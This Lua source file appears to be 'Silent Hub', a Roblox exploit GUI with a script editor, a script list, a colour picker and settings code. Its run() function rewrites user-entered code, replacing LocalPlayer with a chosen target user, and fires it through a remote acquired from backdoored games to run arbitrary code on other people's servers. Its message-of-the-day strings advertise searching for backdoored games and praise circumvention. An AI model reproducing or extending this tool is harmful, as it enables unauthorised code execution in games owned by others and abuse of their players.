					local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
					
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
						releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)
					
					mouseEvent = user.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
						end
					end)
				end
			end)
			
			okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end pickerGui.Visible = false end)
			okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.4 end end)
			okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0 end end)
			
			cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end pickerGui.Visible = false end)
			cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
			cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)
			
			updateColor()
			
			newMt.SetColor = function(self,color)
				red,green,blue = color.r,color.g,color.b
				hue,sat,val = Color3:ToHSV(color)
				updateColor()
			end
			
			return newMt
		end
	end
	
	local picker = ColorPicker.new()
	picker.Confirm = function(self,color)end
	picker.Changed = function(self,color)end
	picker.Cancel = function(self)end
end;
task.spawn(C_6c);
-- StarterGui.Silent Hub.Scripts.LocalScript
local function C_de()
local script = G2L["de"];
	DefaultTab = "Home"
	
	if _G.SilentHubLoaded then return end
	_G.SilentHubLoaded = true
	
	local version = "3.0.0"
	local server = "dsc.gg/teamc00lkidd"
	
	local LocalPlayer = game:GetService("Players").LocalPlayer
	
	local CoreGui = game:GetService("StarterGui")
	local TweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	
	local GUI = script.Parent.Parent
	local Interface = GUI.UI.Interface
	local Open = GUI.UI.Open
	
	local TabContainer = Interface.Container
	
	local ColorPicker = GUI.UI.ColorPick
	
	local TweenSpeed = 0.75
	local ColorPickerOpen = false
	
	local hiddenContainer = UDim2.new(-1.015, 0,0.02, 0)
	local rightContainer = UDim2.new(1.015, 0,0.02, 0)
	local openContainer = UDim2.new(0.015, 0,0.02, 0)
	
	local cachedScr = {}
	local cachedScrTab = "Script1"
	
	
	local darkBack = false
	local lightBack = true
	local backColor = Color3.fromRGB(255, 255, 255)
	local lightColor = Color3.fromRGB(255, 255, 255)
	local darkColor = Color3.fromRGB(150, 150, 150)
	local textColor = Color3.fromRGB(255, 255, 255)
	
	local foldername = "Silent Hub"
	local filename = foldername .. "/Settings.txt"
	
	local Config = _G.SilentHub or {}
	local Log = Config.Log ~= false
	
	local start
	local isAcquiring
	local AcquiredRemote
	
	local keycode = HttpService:GenerateGUID(false)
	
	local mainsettings = {}
	local mainTransparency = 0.9
	local mainTrans = 0.9
	
	local ScriptHub = require(GUI.Scripts.ScriptHub)
	
	local containers = {}
	
	Interface.Visible = false
	Interface.GroupTransparency = 1
	
	local defaultsettings = {
		RedColor = 50/255,
		GreenColor = 50/255,
		BlueColor = 50/255,
		Transparency = 0.075,
		Scale = 1
	}
	
	local scripttabList = ScriptHub.Scripts
	
	local guistabList = ScriptHub.Guis
	
	local mapstabList = ScriptHub.Maps
	
	local lists = {
		{scripttabList, "Scripts"},
		{guistabList, "GUIs"},
		{mapstabList, "Maps"},
	}
	
	local tabNames = {
		"Home",
		"Script Editor",
		"Scripts",
		"GUIs",
		"Maps",
		"Settings",
		"Credits"
	}
	
	local greetings = {
		"Hello",
		"Welcome"
	}
	
	local motd = {
		"There are tons of scripts for you to use in the 'Scripts' tab.",
		"Use the 'Settings' tab to change the appearance of the UI.",
		"Execute scripts and more in the 'Script Editor' tab!",
		"Silent Hub was made with love by @lynxerased, friend me on Discord! ;)",
		"Your custom UI will save on your device by clicking 'Save Settings' in the Settings tab.",
		"Did you know we have an official Roblox group? come join it through our Discord!",
		"Spooky Scary Skeletons send shivers down your spine!",
		"Convert your character to R6 in the 'Script Editor' tab.",
		"The FitnessGram Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues.",
		"If you shoot rockets at Franklin's house and wait long enough, Franklin will eventually show up to defend his home.",
		"WONGA!",
		"I am the eggman, they are the eggmen, I am the walrus, goo goo g'joob!",
		"Our script editor supports several local scripts.",
		"All require script credits go to their creators!",
		"Circumvention is very hot",
		"In the 'Script Editor' tab, you can change to R6 with the press of a button!",
		"In the 'Script Editor' tab, you can change to R15 with the press of a button!",
		"In the 'Script Editor' tab, you can instantly respawn with the press of a button!",
		"Silent Hub is sponsored by team c00lkidd. B)",
		"Thank you for choosing Silent Hub!",
		"Searching for backdoored games? Head over to Requiem! https://req-exe.win",
		"Do a barrell roll!",
		"Aurora Borealis!? At this time of year, at this time of day, in this part of the country, localized entirely within your kitchen!?",
		"Welcome to paradise.",
		"Chicken Nuggets",
		"Silent Hub for da win!",
		"Lynx was here. :3",
		"Shoutout to @14anz_exiled and team c00lkidd 3/4!",
		"get toadroasted you baconhaired bozos",
		"all of your base are belong to us",
		"Oh hey, this game is backdoored! :)",
		"Do people ever actually read these messages?",
		"Play Lua Script Execution! It's gud. ;)",
		"Great for PCs!",
		"Nice day, isn't it, ".. game.Players.LocalPlayer.DisplayName.."?",
		"What's up, ".. game.Players.LocalPlayer.DisplayName.."?",
		"SKRILLEX BANGARANG WUBWUWBWUBWUWBWUB",
		"JOIN ROBUX PLUS! ITS FREEEEEEEEEEEEEE!!!!",
		"THIS IS SPARTA!!",
		"I hope you like reading these messages. ;)",
		"Circumvention is very hot",
		"WOWZERZ! O_O",
		"Hello World!",
		"this is the backdoor scanner ever",
		"Another day, another message you won't read.",
		":3"
	}
	
	
	Interface.Container.Container1.ProfilePicture.Image = game:GetService("Players"):GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
	Interface.Container.Container1.WelcomeText.Text = greetings[math.random(1, #greetings)] .. ", " .. LocalPlayer.DisplayName .. "!"
	Interface.Container.Container1.Server.Text = `Server: {server}`
	Interface.Container.Container1.MOTD.Text = `MOTD: {motd[math.random(1, #motd)]}`
	
	for index, tab in next, tabNames do
		if TabContainer["Container"..index] then containers[tab] = TabContainer["Container"..index] end
	end
	
	task.wait()
	
	local tabList = {}
	
	local currentTab = "None"
	
	local underline = nil
	--local LastTab = nil
	local tweening = false
	local OrigSize = UDim2.new(0, 31,0, 1)
	local tabPos = 0
	local tweenPos = tabPos + 20
	local oldTab = nil
	
	local function createFrame(Active, BackgroundColor3, BackgroundTransparency, BorderSizePixel, ClipsDescendants, Name, Parent, Position, Size)
		local Frame = Instance.new("Frame")
		Frame.Active = Active
		Frame.BackgroundColor3 = BackgroundColor3
		Frame.BackgroundTransparency = BackgroundTransparency
		Frame.BorderSizePixel = BorderSizePixel
		Frame.ClipsDescendants = ClipsDescendants
		Frame.Name = Name
		Frame.Parent = Parent
		Frame.Position = Position
		Frame.Size = Size
		return Frame
	end
	
	local function createTextButton(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, ZIndex, func)
		local TextButton = Instance.new("TextButton")
		local UICorner = Instance.new("UICorner")
		TextButton.BackgroundColor3 = BackgroundColor3
		TextButton.BackgroundTransparency = BackgroundTransparency
		TextButton.BorderSizePixel = BorderSizePixel
		TextButton.Font = Font
		TextButton.Name = Name
		TextButton.Parent = Parent
		TextButton.Position = Position
		TextButton.Size = Size
		TextButton.Text = Text
		TextButton.TextColor3 = TextColor3
		TextButton.TextSize = TextSize
		TextButton.ZIndex = ZIndex
		UICorner.Parent = TextButton
		UICorner.CornerRadius = UDim.new(0, 15)
		TextButton.MouseButton1Click:Connect(func)
		return TextButton
	end
	
	
	local function createTextBox(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, PlaceholderText, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment)
		local TextBox = Instance.new("TextBox")
		TextBox.BackgroundColor3 = BackgroundColor3
		TextBox.BackgroundTransparency = BackgroundTransparency
		TextBox.BorderSizePixel = BorderSizePixel
		TextBox.Font = Font
		TextBox.Name = Name
		TextBox.Parent = Parent
		TextBox.PlaceholderText = PlaceholderText
		TextBox.Position = Position
		TextBox.Size = Size
		TextBox.Text = Text
		TextBox.TextColor3 = TextColor3
		TextBox.TextSize = TextSize
		TextBox.TextWrapped = TextWrapped
		TextBox.TextXAlignment = TextXAlignment
		TextBox.TextYAlignment = TextYAlignment
		return TextBox
	end
	
	local function createImageLabel(BackgroundTransparency, Image, Name, Parent, Position, Selectable, Size, ZIndex)
		local ImageLabel = Instance.new("ImageLabel")
		ImageLabel.BackgroundTransparency = BackgroundTransparency
		ImageLabel.Image = Image
		ImageLabel.Name = Name
		ImageLabel.Parent = Parent
		ImageLabel.Position = Position
		ImageLabel.Selectable = Selectable
		ImageLabel.Size = Size
		ImageLabel.ZIndex = ZIndex
		return ImageLabel
	end
	
	local function createScrollingFrame(BackgroundColor3, BackgroundTransparency, BorderSizePixel, BottomImage, CanvasSize, MidImage, Name, Parent, Position, Rotation, ScrollBarThickness, Selectable, Size, TopImage, Visible)
		local ScrollingFrame = Instance.new("ScrollingFrame")
		ScrollingFrame.BackgroundColor3 = BackgroundColor3
		ScrollingFrame.BackgroundTransparency = BackgroundTransparency
		ScrollingFrame.BorderSizePixel = BorderSizePixel
		ScrollingFrame.BottomImage = BottomImage
		ScrollingFrame.CanvasSize = CanvasSize
		ScrollingFrame.MidImage = MidImage
		ScrollingFrame.Name = Name
		ScrollingFrame.Parent = Parent
		ScrollingFrame.Position = Position
		ScrollingFrame.Rotation = Rotation
		ScrollingFrame.ScrollBarThickness = ScrollBarThickness
		ScrollingFrame.Selectable = Selectable
		ScrollingFrame.Size = Size
		ScrollingFrame.TopImage = TopImage
		ScrollingFrame.Visible = Visible
		return ScrollingFrame
	end
	
	local function ensurefolder()
		if typeof(isfolder) == "function" and typeof(makefolder) == "function" then
			if not isfolder(foldername) then
				makefolder(foldername)
			end
		end
	end
	
	local function readsettings()
		if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then
			return defaultsettings
		end
	
		if not isfile(filename) then
			return defaultsettings
		end
	
		local success, data = pcall(function()
			return HttpService:JSONDecode(readfile(filename))
		end)
	
		if success and type(data) == "table" then
			return data
		end
	
		return defaultsettings
	end
	
	local function writesettings(data)
		if typeof(writefile) ~= "function" then return end
		ensurefolder()
		writefile(filename, HttpService:JSONEncode(data))
	end
	
	local function applysettings(data)
		Interface.BackgroundColor3 = Color3.new(
			data.RedColor or 50/255,
			data.GreenColor or 50/255,
			data.BlueColor or 50/255,
			data.Transparency or 0.075,
			data.Scale or 1
		)
	
		Interface.UIScale.Scale = data.Scale or 1
	end
	
	local function loadsettings()
		ensurefolder()
		mainsettings = readsettings()
		applysettings(mainsettings)
	end
	
	local function resetsettings()
		mainsettings = table.clone(defaultsettings)
		writesettings(mainsettings)
		applysettings(mainsettings)
	end
	
	local function savesettings()
		local data = {
			RedColor = Interface.BackgroundColor3.R,
			GreenColor = Interface.BackgroundColor3.G,
			BlueColor = Interface.BackgroundColor3.B,
			Transparency = Interface.BackgroundTransparency,
			Scale = Interface.UIScale
		}
	
		mainsettings = data
		writesettings(data)
	end
	
	local function changeTab_Index(newtab)
		for _, tab in next, tabNames do
			if containers[tab] and tab ~= newtab and containers[tab].Position ~= hiddenContainer then
				containers[tab]:TweenPosition(rightContainer, "Out", "Quad", TweenSpeed)
			end
		end
		containers[newtab]:TweenPosition(openContainer, "Out", "Quad", TweenSpeed)
	end
	
	local function findoldtab()
		for _, tab in next, tabNames do
			if containers[tab] and containers[tab].Position == rightContainer then
				return tab
			end
		end
		return nil
	end
	
	local function changeTab(tab)
		if not containers[tab] then return end
		if underline ~= nil then
			underline:TweenSizeAndPosition(UDim2.new(0, 2, 0, 0), UDim2.new(0.5, 0, underline.Position.Y.Scale, underline.Position.Y.Offset), "Out", "Quad", TweenSpeed)
		end
		local newUnderline = createFrame(false, backColor, 0, 0, false, "Frame", Interface.Menu.Container, UDim2.new(0.5, 0, 1, -3), UDim2.new(0, 0, 0, 1))
		newUnderline:TweenSize(UDim2.new(0, tabList[tab].TextBounds.X, 0, 1), "Out", "Quad", TweenSpeed)
		changeTab_Index(tab)
		newUnderline.AnchorPoint = Vector2.new(0.5, 1)
		newUnderline.Parent = tabList[tab]
		task.wait(TweenSpeed)
		task.wait(TweenSpeed/2)
		oldTab = findoldtab()
		if oldTab ~= nil and containers[oldTab] then
			containers[oldTab].Position = hiddenContainer
		end
		if underline ~= nil then underline:Destroy() end
		underline = newUnderline
		oldTab = tab
	end
	
	for order, tab in next, tabNames do
		local btn = Instance.new("TextButton")
		btn.Parent = Interface.Menu.Container
		btn.Text = tab
		btn.BackgroundTransparency = 1
		btn.Size = UDim2.new(0,94,0,26)
		btn.Style = Enum.ButtonStyle.Custom
		btn.LayoutOrder = order-1
		btn.TextSize = 15
		btn.FontFace = Font.new(Font.fromEnum(Enum.Font.BuilderSansBold).Family, Enum.FontWeight.Bold, Enum.FontStyle.Normal)
		btn.TextColor3 = Color3.fromRGB(255,255,255)
		btn.TextStrokeTransparency = 1
		btn.MouseButton1Click:Connect(function()
			currentTab = tab
			if tweening == false and tab ~= oldTab then
				tweening = true
				changeTab(tab)
				tweening = false
			end
		end)
		tabList[tab] = btn
	end
	
	local function setFirstTab(tab)
		if tab == nil or not containers[tab] then tab = tabNames[1] end
		tweening = true
		changeTab(tab)
		tweening = false
	end
	
	setFirstTab(DefaultTab)
	
	local _scroll = TabContainer["Container2"].ScrollingFrame
	local _input = _scroll.Input
	local _numbers = _scroll.Lines
	local _sep = _scroll.Separator
	
	local num = 1
	task.spawn(function()
		local function countLines(str)
			local lines = "1"
			num = 1
			for _ in str:gmatch("\n") do
				num = num + 1
				lines = lines.."\n"..num
			end
			return lines
		end
		_input.Changed:Connect(function(scr)
			if scr == "Text" then
				_numbers.Text = (countLines(_input.Text, 1))
				_sep.Size = UDim2.new(0,1,0, _numbers.AbsoluteSize.Y)
				_scroll.CanvasSize = _input.Size
			end
		end)
	end)
	
	-- Script Tab Cache System
	local scrTabs = containers["Script Editor"].Container
	local addTab = scrTabs.Add
	
	_input:GetPropertyChangedSignal("Text"):Connect(function()
		cachedScr[cachedScrTab].text = tostring(_input.Text)
	end)
	
	local function getTabCacheCount()
		local cacheCount = 0
		for index, scr in pairs(cachedScr) do cacheCount += 1 end
		return cacheCount
	end
	
	local function sortCache() -- it messes up after the first few so it is best to index through and retry
		for _, scr in pairs(cachedScr) do
			table.sort(cachedScr, function(scr1, scr2)
				return scr1.order < scr2.order
			end)
		end
	end
	
	local function getTabLayoutOrder(order)
		order = order or 0
		for _, tab in pairs(cachedScr) do
			if tab.order == order then
				return getTabLayoutOrder(order+1)
			end
		end
		return order+1
	end
	
	local function clearTabColors(selected)
		for tab, data in pairs(cachedScr) do
			scrTabs[tab].BackgroundColor3 = Color3.new(255,255,255)
		end
		scrTabs[selected].BackgroundColor3 = Color3.fromRGB(40,40,40)
	end
	
	local function setTabFromCache(selected)
		cachedScrTab = selected
		_input.Text = cachedScr[selected].text
		clearTabColors(selected)
	end
	
	local function resetTabLayoutOrder()
		local valueToReset = getTabLayoutOrder()-1
		for tab, data in pairs(cachedScr) do
			if data.order > valueToReset then
				data.order-=1
				scrTabs[tab].LayoutOrder = data.order
			end
		end
	end
	
	local function createTabName()
		local returnName = "LEET"..math.random(12345,1990807060)
		if scrTabs:FindFirstChild(returnName) then 
			return createTabName()
		end
		return returnName
	end
	
	local _scrOptions = TabContainer["Container2"].OptContainer
	
	local function scriptTabControl()
		local btn = Instance.new("TextButton")
		local btnorder = getTabLayoutOrder()
		local uicorner = Instance.new("UICorner")
		btn.Name = createTabName()
		btn.Text = "Script "..btnorder
		btn.BackgroundColor3 = Color3.new(255,255,255)
		btn.BackgroundTransparency = 0.8
		btn.Style = Enum.ButtonStyle.Custom
		btn.FontFace = Font.new(Font.fromEnum(Enum.Font.BuilderSansBold).Family, Enum.FontWeight.Bold, Enum.FontStyle.Normal)
		btn.TextSize = 14
		btn.TextStrokeTransparency = 1
		btn.TextColor3 = Color3.new(255,255,255)
		btn.Size = UDim2.new(0,66,0,15)
		btn.AutomaticSize = Enum.AutomaticSize.X
		btn.Parent = scrTabs
		btn.LayoutOrder = btnorder-1
		uicorner.Parent = btn
		uicorner.CornerRadius = UDim.new(0,15)
		cachedScr[btn.Name] = {text="", order=btnorder-1}
		cachedScrTab = btn.Name
		_input.Text = ""
		clearTabColors(btn.Name)
		btn.MouseButton1Click:Connect(function()
			setTabFromCache(btn.Name)
		end)
		btn.MouseButton2Click:Connect(function()
			setTabFromCache(btn.Name)
			_scrOptions.Options.TextBox.Text = btn.Text
			_scrOptions.Visible = true
		end)
	end
	scriptTabControl()
	
	addTab.MouseButton1Click:Connect(function()
		scriptTabControl()
		if getTabCacheCount() == 7 then addTab.Visible = false else sortCache() end
	end)
	
	_scrOptions.Options.Close.MouseButton1Click:Connect(function()
		_scrOptions.Visible = false
	end)
	
	_scrOptions.Options.Save.MouseButton1Click:Connect(function()
		scrTabs[cachedScrTab].Text = _scrOptions.Options.TextBox.Text
		_scrOptions.Visible = false
	end)
	
	_scrOptions.Options.Dest.MouseButton1Click:Connect(function()
		local checkCacheList, selectedNextTab = getTabLayoutOrder()-1, cachedScr[cachedScrTab].order+1
		if checkCacheList == 1 then 
			scrTabs[cachedScrTab].Text, _input.Text, _scrOptions.Visible = "Script 1", "", false
			return 
		end
		if cachedScr[cachedScrTab].order == checkCacheList-1 then
			selectedNextTab = cachedScr[cachedScrTab].order-1
		end
		cachedScr[cachedScrTab] = nil
		scrTabs[cachedScrTab]:Destroy()
		for tab, data in next, cachedScr do
			if data.order == selectedNextTab then
				setTabFromCache(tab)
				break
			end
		end
		_scrOptions.Visible, addTab.Visible = false, true
		resetTabLayoutOrder()
		sortCache()
	end)
	
	local function run(code)
		code = code:gsub("%.LocalPlayer", "." .. TabContainer["Container6"].UserTarget.Text or LocalPlayer.Name)
		code = code:gsub("%:GetMouse()", ":IsA('BasePart') or GetMouse")
		code = code:gsub("ame:HttpGet", "ame:GetService(\"HttpService\"):GetAsync")
		code = code:gsub("ame%.CoreGui", `ame.Players.{LocalPlayer.Name}.PlayerGui`)
		code = code:gsub("ame:GetService%(\"CoreGui\"%)", `ame.Players.{LocalPlayer.Name}.PlayerGui`)
		code = code:gsub("ame:GetService%('CoreGui'%)", `ame.Players.{LocalPlayer.Name}.PlayerGui`)
		code = code:gsub("ame.CoreGui", `ame.Players.{LocalPlayer.Name}.PlayerGui`)
		
		AcquiredRemote:FireServer(code)
	end
	
	Interface.Container.Container2.ButtonContainer.Run.MouseButton1Click:Connect(function()
		run(_input.Text)
	end)
	
	Interface.Container.Container2.ButtonContainer.Clear.MouseButton1Click:Connect(function()
		Interface.Container.Container2.ScrollingFrame.Input.Text = ""
	end)
	
	Interface.Container.Container2.ButtonContainer.R6.MouseButton1Click:Connect(function()
		run([[
			local plr = game:GetService("Players").LocalPlayer
	        if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
	        local cfr = plr.Character.PrimaryPart.CFrame
	            local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
	            local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
	            morph:SetPrimaryPartCFrame(cfr)
	            morph.Name = plr.Name
	            plr.Character = morph
	            morph.Parent = workspace    
	        end
		]])
	end)
	
	Interface.Container.Container2.ButtonContainer.R15.MouseButton1Click:Connect(function()
		run([[
			local plr = game:GetService("Players").LocalPlayer
	        if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
	        	local cfr = plr.Character.PrimaryPart.CFrame
	            local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
	            local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R15)
	            morph:SetPrimaryPartCFrame(cfr)
	            morph.Name = plr.Name
	            plr.Character = morph
	            morph.Parent = workspace    
	        end
		]])
	end)
	
	Interface.Container.Container2.ButtonContainer.Respawn.MouseButton1Click:Connect(function()
		run([[
			local plr = game:GetService("Players").LocalPlayer
	        plr:LoadCharacter()
		]])
	end)
	
	for _,list in pairs(lists) do
		local toSort = {}
		local sortedList = {}
		local pos = 0
	
		for _,v in pairs(list[1]) do
			table.insert(toSort, v.name)
		end
	
		table.sort(toSort)
	
		for i,name in pairs(toSort) do
			for i,actualTable in pairs(list[1]) do
				if name == actualTable.name then
					table.insert(sortedList, actualTable)
				end
			end
		end
	
		--Function to create the buttons
		local function createButons(text)
			pos = 5
	
			for _, button in pairs(sortedList) do
				if text == "" or string.find(
					string.lower(button.name),
					string.lower(text),
					1,
					true
					) then
	
					local newButton = createTextButton(
						backColor,
						mainTrans,
						0,
						Enum.Font.BuilderSans,
						button.name,
						containers[list[2]].ScrollingFrame,
						UDim2.new(0, 5, 0, pos),
						UDim2.new(0, 490, 0, 20),
						button.name,
						textColor,
						14,
						1,
						function()
							local args = button.args
							local form_args = ""
	
							if args then
								for index, arg in pairs(args) do
									if arg == "Username" then
										arg = game:GetService("Players").LocalPlayer.Name
									end
	
									if index > 1 then
										form_args ..= ","
									end
	
									form_args ..= '"' .. tostring(arg) .. '"'
								end
							end
	
							local scr = button.module .. "(" .. form_args .. ")"
							run(scr)
						end
					)
	
					-- Make absolutely sure the generated button gets the current theme
					newButton.BackgroundColor3 = backColor
					newButton.BackgroundTransparency = mainTrans
					newButton.TextColor3 = textColor
					newButton.AutoButtonColor = false
	
					pos += 23
				end
			end
		end
	
		--Remove Buttons and create new on search
		local function removeButtons()
			for _,button in pairs(containers[list[2]].ScrollingFrame:GetChildren()) do
				button:Destroy()
			end
		end
	
		--Search Function
		containers[list[2]].TextBox.PlaceholderText = "Search "..list[2]
		containers[list[2]].TextBox.Text = ""
		local function searchBar(chosenList)    
			local search = containers[chosenList].TextBox
			local currentSearch = ""
			search.Changed:connect(function(property)
				if property == "Text" then
					if search.Text ~= "" and search.Text ~= currentSearch then
						currentSearch = search.Text
						removeButtons()
						createButons(search.Text)
					elseif search.Text == "" and currentSearch ~= "" then
						currentSearch = search.Text
						removeButtons()
						createButons("")
					end
				end
			end)
		end 
	
		searchBar(list[2])
	
		createButons("")
	
		containers[list[2]].ScrollingFrame.CanvasSize = UDim2.new(1, 0, 0, pos + 2)
	end
	
	local colourpicker = ColorPicker
	colourpicker.Enabled = false
	
	local function createTextLabel(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment, ZIndex)
		local TextLabel = Instance.new("TextLabel")
		TextLabel.BackgroundColor3 = BackgroundColor3
		TextLabel.BackgroundTransparency = BackgroundTransparency
		TextLabel.BorderSizePixel = BorderSizePixel
		TextLabel.Font = Font
		TextLabel.Name = Name
		TextLabel.Parent = Parent
		TextLabel.Position = Position
		TextLabel.Size = Size
		TextLabel.Text = Text
		TextLabel.TextColor3 = TextColor3
		TextLabel.TextSize = TextSize
		TextLabel.TextWrapped = TextWrapped
		TextLabel.TextXAlignment = TextXAlignment
		TextLabel.TextYAlignment = TextYAlignment
		TextLabel.ZIndex = ZIndex
		return TextLabel
	end
	
	local function createTextBox(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, PlaceholderText, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment)
		local TextBox = Instance.new("TextBox")
		TextBox.BackgroundColor3 = BackgroundColor3
		TextBox.BackgroundTransparency = BackgroundTransparency
		TextBox.BorderSizePixel = BorderSizePixel
		TextBox.Font = Font
		TextBox.Name = Name
		TextBox.Parent = Parent
		TextBox.PlaceholderText = PlaceholderText
		TextBox.Position = Position
		TextBox.Size = Size
		TextBox.Text = Text
		TextBox.TextColor3 = TextColor3
		TextBox.TextSize = TextSize
		TextBox.TextWrapped = TextWrapped
		TextBox.TextXAlignment = TextXAlignment
		TextBox.TextYAlignment = TextYAlignment
		return TextBox
	end
	
	local function createImageLabel(BackgroundTransparency, Image, Name, Parent, Position, Selectable, Size, ZIndex)
		local ImageLabel = Instance.new("ImageLabel")
		ImageLabel.BackgroundTransparency = BackgroundTransparency
		ImageLabel.Image = Image
		ImageLabel.Name = Name
		ImageLabel.Parent = Parent
		ImageLabel.Position = Position
		ImageLabel.Selectable = Selectable
		ImageLabel.Size = Size
		ImageLabel.ZIndex = ZIndex
		return ImageLabel
	end
	
	local function createScrollingFrame(BackgroundColor3, BackgroundTransparency, BorderSizePixel, BottomImage, CanvasSize, MidImage, Name, Parent, Position, Rotation, ScrollBarThickness, Selectable, Size, TopImage, Visible)
		local ScrollingFrame = Instance.new("ScrollingFrame")
		ScrollingFrame.BackgroundColor3 = BackgroundColor3
		ScrollingFrame.BackgroundTransparency = BackgroundTransparency
		ScrollingFrame.BorderSizePixel = BorderSizePixel
		ScrollingFrame.BottomImage = BottomImage
		ScrollingFrame.CanvasSize = CanvasSize
		ScrollingFrame.MidImage = MidImage
		ScrollingFrame.Name = Name
		ScrollingFrame.Parent = Parent
		ScrollingFrame.Position = Position
		ScrollingFrame.Rotation = Rotation
		ScrollingFrame.ScrollBarThickness = ScrollBarThickness
		ScrollingFrame.Selectable = Selectable
		ScrollingFrame.Size = Size
		ScrollingFrame.TopImage = TopImage
		ScrollingFrame.Visible = Visible
		return ScrollingFrame
	end
	
	mainsettings = defaultsettings
	
	local savedColor = Color3.fromRGB(mainsettings.RedColor, mainsettings.GreenColor, mainsettings.BlueColor)
	local mainTransparency = mainsettings.Transparency
	local enableRainbow = mainsettings.RainbowOn
	local rainbowCount = mainsettings.RainbowSpeed
	local mainTrans = mainsettings.Transparency
	local changeColorPickerBack = mainsettings.ChangePickerBackground
	local colorPickerBack = Color3.fromRGB(mainsettings.RedColor, mainsettings.GreenColor, mainsettings.BlueColor)
	
	local ColorPicker = {}
	local function round(num)
		return math.floor(num *10^3 + 0.5) / 10^3
	end
	
	
	local threshold = 185
	local transBackRunning = false
	local tweenTable = {}
	local function updateBack(...)
		local list = {...}
		local color = list[1]
		Interface.BackgroundColor3 = color
		if list[2] and changeColorPickerBack == true then
			list[2].BackgroundColor3 = color
		end
		if round(color.g*255) >= threshold and round(color.b*255) >= threshold and darkBack == false or round(color.g*255) >= threshold and darkBack == false then
			if lightBack == true and transBackRunning == true then
				for _,tween in pairs(tweenTable) do
					tween:Pause()
				end
			end
			tweenTable = {}
			darkBack = true
			lightBack = false
			transBackRunning = true
			for _,tween in pairs(tweenTable) do
				tween:Play()
			end
			pcall(function() tweenTable[1].Completed:Connect(function()
					transBackRunning = false
				end)
			end)
		elseif round(color.g*255) < threshold and round(color.b*255) < threshold and lightBack == false or round(color.g*255) < threshold and lightBack == false then
			if lightBack == true and transBackRunning == true then
				for _,tween in pairs(tweenTable) do
					tween:Pause()
				end
			end
			tweenTable = {}
			lightBack = true
			darkBack = false
			transBackRunning = true
			for _,tween in pairs(tweenTable) do
				tween:Play()
			end
			pcall(function() tweenTable[1].Completed:Connect(function()
					transBackRunning = false
				end)
			end)
		end
	end
	
	ColorPicker.new = function()
		local newMt = setmetatable({},{})
	
		local rootGui = colourpicker
		local pickerGui = rootGui.ColorPicker
		local pickerTopBar = pickerGui.TopBar
		local backDrop = pickerGui
		local pickerFrame = pickerGui.Content
		local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
		local ColorLine = pickerFrame.ColorLine
		local previewFrame = pickerFrame.Preview
		local basicColorsFrame = pickerFrame.BasicColors
		local customColorsFrame = pickerFrame.CustomColors
		local okButton = pickerFrame.Ok
		local cancelButton = pickerFrame.Cancel
		local closeButton = pickerTopBar.Close
		local colorScope = colorSpace.Scope
		local colorArrow = pickerFrame.ArrowFrame.Arrow
		local hueInput = pickerFrame.Hue.Input
		local satInput = pickerFrame.Sat.Input
		local valInput = pickerFrame.Val.Input
		local redInput = pickerFrame.Red.Input
		local greenInput = pickerFrame.Green.Input
		local blueInput = pickerFrame.Blue.Input
		local user = game:GetService("UserInputService")
		local mouse = game:GetService("Players").LocalPlayer:GetMouse()
	
		local hue,sat,val = savedColor:ToHSV()
		local red,green,blue = savedColor.r, savedColor.g, savedColor.b
		local chosenColor = savedColor
